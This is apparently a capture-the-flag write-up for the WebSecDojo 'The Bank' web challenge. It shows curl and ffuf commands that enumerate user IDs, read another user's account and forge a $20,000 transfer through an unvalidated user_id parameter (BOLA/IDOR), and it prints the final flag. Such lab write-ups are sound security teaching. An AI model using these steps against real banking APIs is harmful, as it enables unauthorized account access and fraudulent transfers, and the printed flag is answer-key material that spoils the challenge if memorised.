---
title: "The Bank"
date: 2026-03-20
categories:
  - Web
tags:
  - Web
  - WebSecDojo
collections:
  - WebSecDojo
---


{{< admonition tldr "TL;DR" >}}

**The Bank** is a web challenge from **WebSecDojo**. This challenge focuses on modern banking applications that have vulnerabilities on the API side. The goal is to exploit weak authorization mechanisms to access other users' data and obtain flags.

{{< /admonition >}}

## Challenge Overview

This challenge focuses on modern banking applications that have vulnerabilities on the API side. The goal is to exploit weak authorization mechanisms to access other users' data and obtain flags.

---

## Step 1: Reconnaissance & Enumeration

Perform an initial check on the dashboard after logging in. It can be seen that the URL uses the `user_id` parameter:

```bash
https://websecdojo.com/thebank/dashboard.php?user_id=0
```

Use `curl` To view HTML structure and find API references:

```bash
curl -s "https://websecdojo.com/thebank/dashboard.php?user_id=0" \
     -H "Cookie: PHPSESSID=<SESSION_ID>"
```

Found a JavaScript block that makes a request to `api.php` :

```javascript
fetch('api.php?user_id=' + userId, {
    method: 'POST',
    body: formData
})
```

---

## Step 2: API Fuzzing (BOLA/IDOR)

Since the application determines the user's identity via the `user_id` parameter in the URL, we can perform *fuzzing* to find another valid user ID using `ffuf` . Filter response size 19 (size of `{"status":"failed"}` ):

```bash
ffuf -u "https://websecdojo.com/thebank/api.php?user_id=FUZZ" \
     -w <(seq 1 100) \
     -H "Cookie: PHPSESSID=<SESSION_ID>" \
     -fs 19 -c
```

**Output:**

```
10      [Status: 200, Size: 20]
11      [Status: 200, Size: 20]
```

Two valid IDs were identified: `10` (John Doe) and `11` (Bob Doe).

---

## Step 3: Unauthorized Data Access

Access another user's dashboard (ID 11) To view their balance and transaction history:

```bash
curl -s "https://websecdojo.com/thebank/dashboard.php?user_id=11" \
     -H "Cookie: PHPSESSID=<SESSION_ID>"
```

Results show a balance of **$20,000**. Even though the data is visible, the flag has not been found in the HTML body.

---

## Step 4: Exploiting API Logic Flaw

Attempting to transfer funds from another user's account (ID 11) to the attacker's account ( `admin_hacker` ) by utilizing the `user_id` parameter which is not validated on the server side (Broken Object Level Authorization).

Send request `POST` to the API impersonating user 11:

```bash
curl -X POST "https://websecdojo.com/thebank/api.php?user_id=11" \
     -H "Cookie: PHPSESSID=<SESSION_ID>" \
     -d "recipient=admin_hacker&amount=20000&description=Give_me_the_flag" \
     -i
```

---

## Step 5: Information Disclosure in Headers

Analysis of the response from the server after performing the illegal transfer. The server returns a success status, and a flag is found hidden inside **Custom HTTP Header**:

**Response Headers:**

```http
HTTP/2 200
date: Fri, 20 Mar 2026 15:52:29 GMT
content-type: application/json
x-flag: flag#Th@tWas3asyN0?
...

{"status":"success"}
```

---

## Final Flags

```
flag#Th@tWas3asyN0?
```
